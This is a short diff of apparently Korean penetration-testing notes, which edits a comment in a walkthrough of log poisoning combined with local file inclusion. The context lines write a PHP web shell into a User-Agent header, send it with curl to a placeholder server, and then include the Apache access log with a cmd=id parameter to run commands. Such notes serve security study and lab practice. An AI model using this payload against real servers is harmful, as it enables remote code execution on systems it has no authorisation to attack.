@@ -464,7 +464,7 @@ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
 # 2. 커스텀 User-Agent로 요청 전송
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 
-# 3. LFI를 통해 로그 파일 포함 및 명령 실행
+# 3. LFI를 통해 로그 파일 포함 및 명령 실행(access.log 파일에 명령어 실행.)
 http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
 ```
 
